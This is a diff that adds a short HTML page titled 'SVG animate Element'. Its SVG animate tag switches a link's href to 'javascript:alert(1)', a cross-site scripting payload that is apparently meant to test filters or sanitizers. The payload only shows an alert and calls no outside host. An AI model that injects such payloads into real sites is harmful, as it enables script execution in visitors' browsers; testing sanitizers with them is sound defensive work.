@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>SVG animate Element</h2>
+
+<svg>
+<animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://safe-url?;javascript:alert(1);0" />
+<a id=xss>
+<text x=20 y=20>XSS</text>
+</a>
+
+</body>
+</html>
